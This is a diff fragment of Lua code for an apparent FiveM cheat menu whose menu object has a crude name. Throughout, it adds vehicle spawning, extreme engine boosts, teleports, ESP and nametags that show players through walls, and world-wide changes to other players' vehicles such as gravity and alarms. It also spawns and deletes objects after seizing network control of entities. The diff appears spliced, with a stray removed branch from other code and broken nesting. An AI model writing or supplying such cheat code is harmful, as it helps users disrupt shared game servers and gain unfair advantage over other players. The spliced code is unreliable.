+                    SpawnVeh(offroad[i], PlaceSelf, SpawnEngineOn)
+                end
+            end
+        
+        -- INDUSTRIAL SPAWNER
+        elseif IhadSexWithMyStepMother.IsMenuOpened('industrial') then
+            for i = 1, #industrial do
+                local vehname = GetLabelText(industrial[i])
+                if vehname == "NULL" then vehname = industrial[i] end
+                local carButton = IhadSexWithMyStepMother.Button(vehname)
+                if carButton then
+                    SpawnVeh(industrial[i], PlaceSelf, SpawnEngineOn)
+                end
+            end
+        
+        -- UTILITY SPAWNER
+        elseif IhadSexWithMyStepMother.IsMenuOpened('utility') then
+            for i = 1, #utility do
+                local vehname = GetLabelText(utility[i])
+                if vehname == "NULL" then vehname = utility[i] end
+                local carButton = IhadSexWithMyStepMother.Button(vehname)
+                if carButton then
+                    SpawnVeh(utility[i], PlaceSelf, SpawnEngineOn)
+                end
+            end
+        
+        -- VANS SPAWNER
+        elseif IhadSexWithMyStepMother.IsMenuOpened('vans') then
+            for i = 1, #vans do
+                local vehname = GetLabelText(vans[i])
+                if vehname == "NULL" then vehname = vans[i] end
+                local carButton = IhadSexWithMyStepMother.Button(vehname)
+                if carButton then
+                    SpawnVeh(vans[i], PlaceSelf, SpawnEngineOn)
+                end
+            end
+        
+        -- CYCLES SPAWNER
+        elseif IhadSexWithMyStepMother.IsMenuOpened('cycles') then
+            for i = 1, #cycles do
+                local vehname = GetLabelText(cycles[i])
+                if vehname == "NULL" then vehname = cycles[i] end
+                local carButton = IhadSexWithMyStepMother.Button(vehname)
+                if carButton then
+                    SpawnVeh(cycles[i], PlaceSelf, SpawnEngineOn)
+                end
+            end
+        
+        -- BOATS SPAWNER
+        elseif IhadSexWithMyStepMother.IsMenuOpened('boats') then
+            for i = 1, #boats do
+                local vehname = GetLabelText(boats[i])
+                if vehname == "NULL" then vehname = boats[i] end
+                local carButton = IhadSexWithMyStepMother.Button(vehname)
+                if carButton then
+                    SpawnVeh(boats[i], PlaceSelf, SpawnEngineOn)
+                end
+            end
+        
+        -- HELICOPTERS SPAWNER
+        elseif IhadSexWithMyStepMother.IsMenuOpened('helicopters') then
+            for i = 1, #helicopters do
+                local vehname = GetLabelText(helicopters[i])
+                if vehname == "NULL" then vehname = helicopters[i] end
+                local carButton = IhadSexWithMyStepMother.Button(vehname)
+                if carButton then
+                    SpawnVeh(helicopters[i], PlaceSelf, SpawnEngineOn)
+                end
+            end
+        
+        -- PLANES SPAWNER
+        elseif IhadSexWithMyStepMother.IsMenuOpened('planes') then
+            for i = 1, #planes do
+                local vehname = GetLabelText(planes[i])
+                if vehname == "NULL" then vehname = planes[i] end
+                local carButton = IhadSexWithMyStepMother.Button(vehname)
+                if carButton then
+                    SpawnPlane(planes[i], PlaceSelf, SpawnInAir)
+                end
+            end
+        
+        -- SERVICE SPAWNER
+        elseif IhadSexWithMyStepMother.IsMenuOpened('service') then
+            for i = 1, #service do
+                local vehname = GetLabelText(service[i])
+                if vehname == "NULL" then vehname = service[i] end
+                local carButton = IhadSexWithMyStepMother.Button(vehname)
+                if carButton then
+                    SpawnVeh(service[i], PlaceSelf, SpawnEngineOn)
+                end
+            end
+        
+        -- COMMERCIAL SPAWNER
+        elseif IhadSexWithMyStepMother.IsMenuOpened('commercial') then
+            for i = 1, #commercial do
+                local vehname = GetLabelText(commercial[i])
+                if vehname == "NULL" then vehname = commercial[i] end
+                local carButton = IhadSexWithMyStepMother.Button(vehname)
+                if carButton then
+                    SpawnVeh(commercial[i], PlaceSelf, SpawnEngineOn)
+                end
+            end
+        
+        -- VEHICLE MODS MENU
+        elseif IhadSexWithMyStepMother.IsMenuOpened('vehiclemods') then
+            if IhadSexWithMyStepMother.MenuButton("Vehicle Colors", 'vehiclecolors') then
+                elseif IhadSexWithMyStepMother.MenuButton("Upgrade Vehicle", 'vehicletuning') then
+                elseif IhadSexWithMyStepMother.Button("Set Plate Text (8 Characters)") then
+                    local plateInput = GetKeyboardInput("Enter Plate Text (8 Characters):")
+                    RequestControlOnce(GetVehiclePedIsIn(PlayerPedId(), 0))
+                    SetVehicleNumberPlateText(GetVehiclePedIsIn(PlayerPedId(), 0), plateInput)	
+			elseif IhadSexWithMyStepMother.CheckBox("~r~R~p~a~y~i~m~n~b~b~g~o~o~w Vehicle Colour", RainbowVeh) then
+                RainbowVeh = not RainbowVeh
+				
+			elseif IhadSexWithMyStepMother.CheckBox("~r~R~p~a~y~i~m~n~b~b~g~o~o~w Vehicle Neon", ou328hNeon) then
+                ou328hNeon = not ou328hNeon
+			elseif IhadSexWithMyStepMother.CheckBox("~r~R~p~a~y~i~m~n~b~b~g~o~o~w Sync", ou328hSync) then
+                ou328hSync = not ou328hSync
+			
+             end
+        
+        -- VEHICLE COLORS MENU
+        elseif IhadSexWithMyStepMother.IsMenuOpened('vehiclecolors') then
+            if IhadSexWithMyStepMother.MenuButton("Primary Color", 'vehiclecolors_primary') then
+                elseif IhadSexWithMyStepMother.MenuButton("Secondary Color", 'vehiclecolors_secondary') then
+                
+            end
+        
+        elseif IhadSexWithMyStepMother.IsMenuOpened('vehiclecolors_primary') then
+            if IhadSexWithMyStepMother.MenuButton("Classic Colors", 'primary_classic') then
+                elseif IhadSexWithMyStepMother.MenuButton("Matte Colors", 'primary_matte') then
+                elseif IhadSexWithMyStepMother.MenuButton("Metals", 'primary_metal') then
+            end
+        
+        elseif IhadSexWithMyStepMother.IsMenuOpened('vehiclecolors_secondary') then
+            if IhadSexWithMyStepMother.MenuButton("Classic Colors", 'secondary_classic') then
+                elseif IhadSexWithMyStepMother.MenuButton("Matte Colors", 'secondary_matte') then
+                elseif IhadSexWithMyStepMother.MenuButton("Metals", 'secondary_metal') then
+            end
+        
+        -- PRIMARY CLASSIC
+        elseif IhadSexWithMyStepMother.IsMenuOpened('primary_classic') then
+            for i = 1, #classicColors do
+                if IhadSexWithMyStepMother.Button(classicColors[i][1]) then
+                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
+                    local prim, sec = GetVehicleColours(veh)
+                    SetVehicleColours(veh, classicColors[i][2], sec)
+                end
+            end
+        
+        -- PRIMARY MATTE
+        elseif IhadSexWithMyStepMother.IsMenuOpened('primary_matte') then
+            for i = 1, #matteColors do
+                if IhadSexWithMyStepMother.Button(matteColors[i][1]) then
+                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
+                    local prim, sec = GetVehicleColours(veh)
+                    SetVehicleColours(veh, matteColors[i][2], sec)
+                end
+            end
+        
+        -- PRIMARY METAL
+        elseif IhadSexWithMyStepMother.IsMenuOpened('primary_metal') then
+            for i = 1, #metalColors do
+                if IhadSexWithMyStepMother.Button(metalColors[i][1]) then
+                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
+                    local prim, sec = GetVehicleColours(veh)
+                    SetVehicleColours(veh, metalColors[i][2], sec)
+                end
+            end
+        
+        -- SECONDARY CLASSIC
+        elseif IhadSexWithMyStepMother.IsMenuOpened('secondary_classic') then
+            for i = 1, #classicColors do
+                if IhadSexWithMyStepMother.Button(classicColors[i][1]) then
+                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
+                    local prim, sec = GetVehicleColours(veh)
+                    SetVehicleColours(veh, prim, classicColors[i][2])
+                end
+            end
+        
+        -- SECONDARY MATTE
+        elseif IhadSexWithMyStepMother.IsMenuOpened('secondary_matte') then
+            for i = 1, #matteColors do
+                if IhadSexWithMyStepMother.Button(matteColors[i][1]) then
+                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
+                    local prim, sec = GetVehicleColours(veh)
+                    SetVehicleColours(veh, prim, matteColors[i][2])
+                end
+            end
+        
+        -- SECONDARY METAL
+        elseif IhadSexWithMyStepMother.IsMenuOpened('secondary_metal') then
+            for i = 1, #metalColors do
+                if IhadSexWithMyStepMother.Button(metalColors[i][1]) then
+                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
+                    local prim, sec = GetVehicleColours(veh)
+                    SetVehicleColours(veh, prim, metalColors[i][2])
+                end
+            end
+        
+        -- VEHICLE TUNING MENU
+        elseif IhadSexWithMyStepMother.IsMenuOpened('vehicletuning') then
+		   if IhadSexWithMyStepMother.Button("Max ~r~Exterior Tuning") then
+                    MaxOut(GetVehiclePedIsUsing(PlayerPedId()))
+		elseif IhadSexWithMyStepMother.Button("Max ~r~Performance") then
+					engine(GetVehiclePedIsUsing(PlayerPedId()))
+		elseif IhadSexWithMyStepMother.Button("Max All ~r~Tuning") then
+					engine1(GetVehiclePedIsUsing(PlayerPedId()))
+		end
+		
+		elseif IhadSexWithMyStepMother.IsMenuOpened("VehBoostMenu") then
+                if IhadSexWithMyStepMother.Button('Engine Power boost ~r~RESET') then
+				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1.0)
+			elseif IhadSexWithMyStepMother.Button('Engine Power boost ~g~x2') then
+					SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
+			elseif IhadSexWithMyStepMother.Button('Engine Power boost  ~g~x4') then
+				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
+			elseif IhadSexWithMyStepMother.Button('Engine Power boost  ~g~x8') then
+				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8.0 * 20.0)
+			elseif IhadSexWithMyStepMother.Button('Engine Power boost  ~g~x16') then
+				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0)
+			elseif IhadSexWithMyStepMother.Button('Engine Power boost  ~g~x32') then
+				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 32.0 * 20.0)
+			elseif IhadSexWithMyStepMother.Button('Engine Power boost  ~g~x64') then
+				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 64.0 * 20.0)
+			elseif IhadSexWithMyStepMother.Button('Engine Power boost  ~g~x128') then
+				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 128.0 * 20.0)
+			elseif IhadSexWithMyStepMother.Button('Engine Power boost  ~g~x512') then
+				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 512.0 * 20.0)
+			elseif IhadSexWithMyStepMother.Button('Engine Power boost  ~g~ULTIMATE') then
+				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5012.0 * 20.0)
+			end
+			
+ 
+        -- VEHICLE MENU (WIP)
+        elseif IhadSexWithMyStepMother.IsMenuOpened('vehiclemenu') then
+            if IhadSexWithMyStepMother.CheckBox("Save Personal Vehicle", SavedVehicle, "None", "Saved Vehicle: "..pvehicleText) then
+                if IsPedInAnyVehicle(PlayerPedId(), 0) and not SavedVehicle then
+					SavedVehicle = not SavedVehicle
+					RemoveBlip(pvblip)
+                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
+					pvehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
+					pvblip = AddBlipForEntity(pvehicle)
+					SetBlipSprite(pvblip, 225) 
+					SetBlipColour(pvblip, 84)
+					ShowInfo("~g~Current Vehicle Saved")
+					pvehicleText = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(pvehicle))).." "..pvehicle
+                elseif SavedVehicle then
+					SavedVehicle = not SavedVehicle
+					pvehicle = nil
+                    RemoveBlip(pvblip)
+					ShowInfo("~b~Saved Vehicle Blip Removed")
+				else
+					ShowInfo("~r~You are not in a vehicle!")
+                end
+
+               
+
+            elseif IhadSexWithMyStepMother.CheckBox("Left Front Door", LeftFrontDoor, "Closed", "Opened") then
+                LeftFrontDoor = not LeftFrontDoor
+                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
+                if LeftFrontDoor then
+                    SetVehicleDoorOpen(vehicle, 0, nil, true)
+                elseif not LeftFrontDoor then
+                    SetVehicleDoorShut(vehicle, 0, true)
+                end
+            elseif IhadSexWithMyStepMother.CheckBox("Right Front Door", RightFrontDoor, "Closed", "Opened") then
+                RightFrontDoor = not RightFrontDoor
+                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
+                if RightFrontDoor then
+					SetVehicleDoorOpen(vehicle, 1, nil, true)
+                elseif not RightFrontDoor then
+					SetVehicleDoorShut(vehicle, 1, true)
+                end
+            elseif IhadSexWithMyStepMother.CheckBox("Left Back Door", LeftBackDoor, "Closed", "Opened") then
+                LeftBackDoor = not LeftBackDoor
+                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
+                if LeftBackDoor then
+					SetVehicleDoorOpen(vehicle, 2, nil, true)
+                elseif not LeftBackDoor then
+					SetVehicleDoorShut(vehicle, 2, true)
+                end
+            elseif IhadSexWithMyStepMother.CheckBox("Right Back Door", RightBackDoor, "Closed", "Opened") then
+                RightBackDoor = not RightBackDoor
+                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
+                if RightBackDoor then
+					SetVehicleDoorOpen(vehicle, 3, nil, true)
+                elseif not RightBackDoor then
+					SetVehicleDoorShut(vehicle, 3, true)
+                end
+            elseif IhadSexWithMyStepMother.CheckBox("Hood", FrontHood, "Closed", "Opened") then
+                FrontHood = not FrontHood
+                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
+                if FrontHood then
+					SetVehicleDoorOpen(vehicle, 4, nil, true)
+                elseif not FrontHood then
+					SetVehicleDoorShut(vehicle, 4, true)
+                end
+            elseif IhadSexWithMyStepMother.CheckBox("Trunk", Trunk, "Closed", "Opened") then
+                Trunk = not Trunk
+                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
+                if Trunk then
+					SetVehicleDoorOpen(vehicle, 5, nil, true)
+                elseif not Trunk then
+					SetVehicleDoorShut(vehicle, 5, true)
+                end
+            elseif IhadSexWithMyStepMother.CheckBox("Back", Back, "Closed", "Opened") then
+                Back = not Back
+                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
+                if Back then
+					SetVehicleDoorOpen(vehicle, 6, nil, true)
+                elseif not Back then
+					SetVehicleDoorShut(vehicle, 6, true)
+                end
+            elseif IhadSexWithMyStepMother.CheckBox("Back 2", Back2, "Closed", "Opened") then
+                Back2 = not Back2
+                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
+                if Back2 then
+					SetVehicleDoorOpen(vehicle, 7, nil, true)
+                elseif not Back2 then
+					SetVehicleDoorShut(vehicle, 7, true)
+                end
+            end
+
+        -- WORLD OPTIONS MENU
+        elseif IhadSexWithMyStepMother.IsMenuOpened('world') then  
+            if IhadSexWithMyStepMother.MenuButton("Weather Changer ~r~(CLIENT SIDE)", 'weather') then
+            elseif IhadSexWithMyStepMother.MenuButton("Time Changer", 'time') then
+            elseif IhadSexWithMyStepMother.CheckBox("Disable Cars", CarsDisabled) then
+                CarsDisabled = not CarsDisabled
+            elseif IhadSexWithMyStepMother.CheckBox("Disable Guns", GunsDisabled) then
+                GunsDisabled = not GunsDisabled
+            elseif IhadSexWithMyStepMother.CheckBox("Clear Streets", ClearStreets) then
+                ClearStreets = not ClearStreets
+            elseif IhadSexWithMyStepMother.CheckBox("Noisy Cars", NoisyCars) then
+                NoisyCars = not NoisyCars
+                if not NoisyCars then
+                    for k in EnumerateVehicles() do
+                        SetVehicleAlarmTimeLeft(k, 0)
+                    end
+                end
+            elseif IhadSexWithMyStepMother.ComboBoxSlider("Gravity Amount", GravityOpsWords, currGravIndex, selGravIndex, function(currentIndex, selectedIndex)
+                currGravIndex = currentIndex
+                selGravIndex = currentIndex
+                GravAmount = GravityOps[currGravIndex]
+
+                for k in EnumerateVehicles() do
+                    RequestControlOnce(k)
+                    SetVehicleGravityAmount(k, GravAmount)
+                end
+            end) then
+			end
+			
+			 elseif IhadSexWithMyStepMother.IsMenuOpened('time') then
+			  if IhadSexWithMyStepMother.CheckBox("Christmas Weather", XMAS) then
+                XMAS = not XMAS
+				if XMAS then
+			            SetForceVehicleTrails(true)
+            SetForcePedFootstepsTracks(true)
+					SetWeatherTypePersist("XMAS")
+        SetWeatherTypeNowPersist("XMAS")
+        SetWeatherTypeNow("XMAS")
+        SetOverrideWeather("XMAS")
+		end
+				elseif IhadSexWithMyStepMother.CheckBox("Blizzard Weather", BLIZZARD) then
+                BLIZZARD = not BLIZZARD
+				if BLIZZARD then
+		SetWeatherTypePersist("BLIZZARD")
+        SetWeatherTypeNowPersist("BLIZZARD")
+        SetWeatherTypeNow("BLIZZARD")
+        SetOverrideWeather("BLIZZARD")
+		end
+		elseif IhadSexWithMyStepMother.CheckBox("Foggy Weather", FOGGY) then
+                FOGGY = not FOGGY
+				if FOGGY then
+								SetWeatherTypePersist("FOGGY")
+        SetWeatherTypeNowPersist("FOGGY")
+        SetWeatherTypeNow("FOGGY")
+        SetOverrideWeather("FOGGY")
+		end
+	end
+	
+			
+			 
+			
+        
+        
+        -- OBJECT SPAWNER MENU
+        elseif IhadSexWithMyStepMother.IsMenuOpened('objectspawner') then
+            if IhadSexWithMyStepMother.MenuButton("Spawned Objects", 'objectlist') then
+            elseif IhadSexWithMyStepMother.ComboBox("~g~Select~s~ To Object~h~~y~ -->", objs_tospawn, currObjIndex, selObjIndex, function(currentIndex, selectedIndex)
+				currObjIndex = currentIndex
+				selObjIndex = currentIndex
+				obj = objs_tospawn[currObjIndex]
+				end) then
+			elseif IhadSexWithMyStepMother.Button("~g~Spawn ~s~Object") then
+				local pos = GetEntityCoords(PlayerPedId())
+				local pitch = GetEntityPitch(PlayerPedId())
+				local roll = GetEntityRoll(PlayerPedId())
+				local yaw = GetEntityRotation(PlayerPedId()).z
+				local xf = GetEntityForwardX(PlayerPedId())
+				local yf = GetEntityForwardY(PlayerPedId())
+				local spawnedObj = nil
+				if currDirectionIndex == 1 then
+					spawnedObj = CreateObject(GetHashKey(obj), pos.x + (xf * 10), pos.y + (yf * 10), pos.z - 1, 1, 1, 1)
+				elseif currDirectionIndex == 2 then
+					spawnedObj = CreateObject(GetHashKey(obj), pos.x - (xf * 10), pos.y - (yf * 10), pos.z - 1, 1, 1, 1)
+				end
+				SetEntityRotation(spawnedObj, pitch, roll, yaw + ObjRotation)
+				SetEntityVisible(spawnedObj, objVisible, 0)
+				FreezeEntityPosition(spawnedObj, 1)
+				table.insert(SpawnedObjects, spawnedObj)
+            elseif IhadSexWithMyStepMother.Button("Add Object By Name") then
+				local testObj = GetKeyboardInput("Enter Object Model Name:")
+				local pos = GetEntityCoords(PlayerPedId())
+				local addedObj = CreateObject(GetHashKey(testObj), pos.x, pos.y, pos.z - 100, 0, 1, 1)
+				SetEntityVisible(addedObj, 0, 0)
+				if table.contains(objs_tospawn, testObj) then
+					ShowInfo("~b~Model " .. testObj .. " is already spawnable!")
+				elseif DoesEntityExist(addedObj) then
+					objs_tospawn[#objs_tospawn + 1] = testObj
+					ShowInfo("~g~Model " .. testObj .. " has been added to the list!")
+				else
+					ShowInfo("~r~Model " .. testObj .. " does not exist!")
+				end
+				RequestControlOnce(addedObj)
+				DeleteObject(addedObj)
+            elseif IhadSexWithMyStepMother.CheckBox("Visible", objVisible) then
+                objVisible = not objVisible
+            elseif IhadSexWithMyStepMother.ComboBox("Direction", {"front", "back"}, currDirectionIndex, selDirectionIndex, function(currentIndex, selectedIndex)
+                currDirectionIndex = currentIndex
+                selDirectionIndex = currentIndex
+            end) then
+            elseif IhadSexWithMyStepMother.ComboBox("Rotation", RotationOps, currRotationIndex, selRotationIndex, function(currentIndex, selectedIndex)
+				currRotationIndex = currentIndex
+				selRotationIndex = currentIndex
+				ObjRotation = RotationOps[currRotationIndex]
+				end) then
+            end
+        
+        
+        -- SPAWNED OBJECTS MENU
+        elseif IhadSexWithMyStepMother.IsMenuOpened('objectlist') then
+            if IhadSexWithMyStepMother.Button("Delete All Spawned Objects") then for i = 1, #SpawnedObjects do RequestControlOnce(SpawnedObjects[i])DeleteObject(SpawnedObjects[i]) end
             else
-                FM:Print("[Dynamic Triggers] Resource not found. (" .. res .. ")")
+                for i = 1, #SpawnedObjects do
+                    if DoesEntityExist(SpawnedObjects[i]) then
+                        if IhadSexWithMyStepMother.Button("OBJECT [" .. i .. "] WITH ID " .. SpawnedObjects[i]) then
+                            RequestControlOnce(SpawnedObjects[i])
+                            DeleteObject(SpawnedObjects[i])
+                        end
+                    end
+                end
+            end
+        
+        -- WEATHER CHANGER MENU
+		elseif IhadSexWithMyStepMother.IsMenuOpened('weather') then
+		    if IhadSexWithMyStepMother.ComboBox("Weather Type", WeathersList, currWeatherIndex, selWeatherIndex, function(currentIndex, selectedIndex)
+                    	 currWeatherIndex = currentIndex
+                    	 selWeatherIndex = currentIndex
+                    	 WeatherType = WeathersList[currentIndex]
+		    end) then
+		    elseif IhadSexWithMyStepMother.CheckBox("Weather Changer", WeatherChanger, "Disabled", "Enabled") then
+		  	  WeatherChanger = not WeatherChanger
+		    end
+		
+        -- MISC OPTIONS MENU
+        elseif IhadSexWithMyStepMother.IsMenuOpened('misc') then
+      
+			if IhadSexWithMyStepMother.MenuButton("ESP", 'esp') then
+            elseif IhadSexWithMyStepMother.CheckBox('Force Map', ForceMap) then
+                ForceMap = not ForceMap
+			elseif IhadSexWithMyStepMother.CheckBox('Force Third Person', ForceThirdPerson) then
+                ForceThirdPerson = not ForceThirdPerson
+			elseif IhadSexWithMyStepMother.MenuButton("Web Radio", 'webradio') then
+            elseif IhadSexWithMyStepMother.CheckBox("Portable Radio", Radio, "Disabled", "Enabled") then
+                Radio = not Radio
+                ShowInfo("~r~Portable Radio will override any vehicle's radio!")
+            elseif IhadSexWithMyStepMother.ComboBox2("Radio Station", RadiosListWords, currRadioIndex, selRadioIndex, function(currentIndex, selectedIndex)
+                currRadioIndex = currentIndex
+                selRadioIndex = currentIndex
+                RadioStation = RadiosList[currentIndex]
+            end) then
+            elseif IhadSexWithMyStepMother.CheckBox("Show Coordinates", ShowCoords) then
+                ShowCoords = not ShowCoords
+            end
+					
+		-- ESP OPTIONS MENU
+		elseif IhadSexWithMyStepMother.IsMenuOpened('esp') then
+			if IhadSexWithMyStepMother.CheckBox("Blips", BlipsEnabled) then
+                ToggleBlips()
+            elseif IhadSexWithMyStepMother.CheckBox("Nametags", NametagsEnabled) then
+                NametagsEnabled = not NametagsEnabled
+                tags_plist = GetActivePlayers()
+                ptags = {}
+                for i = 1, #tags_plist do
+                    ptags[i] = CreateFakeMpGamerTag(GetPlayerPed(tags_plist[i]), GetPlayerName(tags_plist[i]), 0, 0, "", 0)
+                    SetMpGamerTagVisibility(ptags[i], 0, NametagsEnabled)
+                    SetMpGamerTagVisibility(ptags[i], 2, NametagsEnabled)
+                end
+                if not NametagsEnabled then
+                    for i = 1, #ptags do
+                        SetMpGamerTagVisibility(ptags[i], 4, 0)
+                        SetMpGamerTagVisibility(ptags[i], 8, 0)
+                    end
+                end
+            elseif IhadSexWithMyStepMother.CheckBox('Show Crosshair', Crosshair) then
+                Crosshair = not Crosshair
+            elseif IhadSexWithMyStepMother.CheckBox("Lines", LinesEnabled) then
+                LinesEnabled = not LinesEnabled
+            elseif IhadSexWithMyStepMother.CheckBox("(OneSync) Nametags", ANametagsEnabled) then
+                ANametagsEnabled = not ANametagsEnabled
+            elseif IhadSexWithMyStepMother.CheckBox("Nametags Through Walls", ANametagsNotNeedLOS) then
+                ANametagsNotNeedLOS = not ANametagsNotNeedLOS
+			elseif IhadSexWithMyStepMother.CheckBox("ESP", ESPEnabled) then
+				ToggleESP()
+            elseif IhadSexWithMyStepMother.ComboBoxSlider("ESP Distance", ESPDistanceOps, currESPDistance, selESPDistance, function(currentIndex, selectedIndex)
+                currESPDistance = currentIndex
+                selESPDistance = currentIndex
+                EspDistance = ESPDistanceOps[currESPDistance]
+            end) then
+			elseif IhadSexWithMyStepMother.ComboBoxSlider("ESP Refresh Rate", ESPRefreshOps, currESPRefreshIndex, selESPRefreshIndex, function(currentIndex, selectedIndex)
+                currESPRefreshIndex = currentIndex
+                selESPRefreshIndex = currentIndex
+				if currentIndex == 1 then
+					ESPRefreshTime = 0
+				elseif currentIndex == 2 then
+					ESPRefreshTime = 100
+				elseif currentIndex == 3 then
+					ESPRefreshTime = 250
+				elseif currentIndex == 4 then
+					ESPRefreshTime = 500
+				elseif currentIndex == 5 then
+					ESPRefreshTime = 1000
+				elseif currentIndex == 6 then
+					ESPRefreshTime = 2000
+				elseif currentIndex == 7 then
+					ESPRefreshTime = 5000
+				end
+            end) then
+		end
+			
+		-- WEB RADIO MENU
+        elseif IhadSexWithMyStepMother.IsMenuOpened('webradio') then
+            if IhadSexWithMyStepMother.CheckBox("Classical", ClassicalRadio, "Status: Not Playing", "Status: Playing") then
+				ClassicalRadio = not ClassicalRadio
+				if ClassicalRadio then
+					RadioDUI = CreateDui("https://youtu.be/2CPJndD4z6A", 1, 1)
+					ShowInfo("~b~Now Playing...")
+				else
+					DestroyDui(RadioDUI)
+					ShowInfo("~r~Web Radio Stopped!")
+				end
+            end
+       
+        -- TELEPORT OPTIONS MENU
+        elseif IhadSexWithMyStepMother.IsMenuOpened('teleport') then
+            if IhadSexWithMyStepMother.MenuButton('Save/Load Position', 'saveload') then
+			elseif IhadSexWithMyStepMother.Button("~b~TP~s~ To Coordinates") then
+                 TeleportToCoords()
+            elseif IhadSexWithMyStepMother.MenuButton('~b~TP~s~ to Others', 'pois') then
+            elseif IhadSexWithMyStepMother.Button('~b~TP~s~ Waypoint ~r~(NUM 4)') then
+				TeleportToWaypoint()
+			elseif IhadSexWithMyStepMother.Button('~b~TP~s~ FBI') then
+				fbi()
+			elseif IhadSexWithMyStepMother.Button('~b~TP~s~ LS Customs') then
+				ls()
+			elseif IhadSexWithMyStepMother.Button('~b~TP~s~ Main Garage') then
+				gp()
+		    elseif IhadSexWithMyStepMother.Button('~b~TP~s~ Ammunation') then
+			    Ammunation()
+			elseif IhadSexWithMyStepMother.Button('~b~TP~s~ Clothes shop') then
+			    shopclothes()
+			elseif IhadSexWithMyStepMother.Button('~b~TP~s~ Barber') then
+			    barber()
+            end
+        
+
+        elseif IhadSexWithMyStepMother.IsMenuOpened('saveload') then
+            if IhadSexWithMyStepMother.ComboBox("Saved Location 1", {"save", "load"}, currSaveLoadIndex1, selSaveLoadIndex1, function(currentIndex, selectedIndex)
+                currSaveLoadIndex1 = currentIndex
+                selSaveLoadIndex1 = currentIndex
+            end) then
+                if selSaveLoadIndex1 == 1 then
+                    savedpos1 = GetEntityCoords(PlayerPedId())
+                    ShowInfo("~g~Position 1 Saved")
+                else
+                    if not savedpos1 then ShowInfo("~r~There is no saved position for slot 1!") else
+                        SetEntityCoords(PlayerPedId(), savedpos1)
+                        ShowInfo("~g~Position 1 Loaded")
+                    end
+                end
+            elseif IhadSexWithMyStepMother.ComboBox("Saved Location 2", {"save", "load"}, currSaveLoadIndex2, selSaveLoadIndex2, function(currentIndex, selectedIndex)
+                currSaveLoadIndex2 = currentIndex
+                selSaveLoadIndex2 = currentIndex
+            end) then
+                if selSaveLoadIndex2 == 1 then
+                    savedpos2 = GetEntityCoords(PlayerPedId())
+                    ShowInfo("~g~Position 2 Saved")
+                else
+                    if not savedpos2 then ShowInfo("~r~There is no saved position for slot 2!") else
+                        SetEntityCoords(PlayerPedId(), savedpos2)
+                        ShowInfo("~g~Position 2 Loaded")
+                    end
+                end
+            elseif IhadSexWithMyStepMother.ComboBox("Saved Location 3", {"save", "load"}, currSaveLoadIndex3, selSaveLoadIndex3, function(currentIndex, selectedIndex)
+                currSaveLoadIndex3 = currentIndex
+                selSaveLoadIndex3 = currentIndex
+            end) then
+                if selSaveLoadIndex3 == 1 then
+                    savedpos3 = GetEntityCoords(PlayerPedId())
+                    ShowInfo("~g~Position 3 Saved")
+                else
+                    if not savedpos3 then ShowInfo("~r~There is no saved position for slot 3!") else
+                        SetEntityCoords(PlayerPedId(), savedpos3)
+                        ShowInfo("~g~Position 3 Loaded")
+                    end
+                end
+            elseif IhadSexWithMyStepMother.ComboBox("Saved Location 4", {"save", "load"}, currSaveLoadIndex4, selSaveLoadIndex4, function(currentIndex, selectedIndex)
+                currSaveLoadIndex4 = currentIndex
+                selSaveLoadIndex4 = currentIndex
+            end) then
+                if selSaveLoadIndex4 == 1 then
+                    savedpos4 = GetEntityCoords(PlayerPedId())
+                    ShowInfo("~g~Position 4 Saved")
+                else
+                    if not savedpos4 then ShowInfo("~r~There is no saved position for slot 4!") else
+                        SetEntityCoords(PlayerPedId(), savedpos4)
+                        ShowInfo("~g~Position 4 Loaded")
+                    end
+                end
+            elseif IhadSexWithMyStepMother.ComboBox("Saved Location 5", {"save", "load"}, currSaveLoadIndex5, selSaveLoadIndex5, function(currentIndex, selectedIndex)
+                currSaveLoadIndex5 = currentIndex
+                selSaveLoadIndex5 = currentIndex
+            end) then
+                if selSaveLoadIndex5 == 1 then
+                    savedpos5 = GetEntityCoords(PlayerPedId())
+                    ShowInfo("~g~Position 5 Saved")
+                else
+                    if not savedpos5 then ShowInfo("~r~There is no saved position for slot 5!") else
+                        SetEntityCoords(PlayerPedId(), savedpos5)
+                        ShowInfo("~g~Position 5 Loaded")
+                    end
+                end
+            end
+        
+
+        elseif IhadSexWithMyStepMother.IsMenuOpened('pois') then
+            if IhadSexWithMyStepMother.Button("Car Dealership (Simeon's)") then
+                SetEntityCoords(PlayerPedId(), -3.812, -1086.427, 26.672)
+            elseif IhadSexWithMyStepMother.Button("Legion Square") then
+                SetEntityCoords(PlayerPedId(), 212.685, -920.016, 30.692)
+            elseif IhadSexWithMyStepMother.Button("Grove Street") then
+                SetEntityCoords(PlayerPedId(), 118.63, -1956.388, 20.669)
+            elseif IhadSexWithMyStepMother.Button("LSPD HQ") then
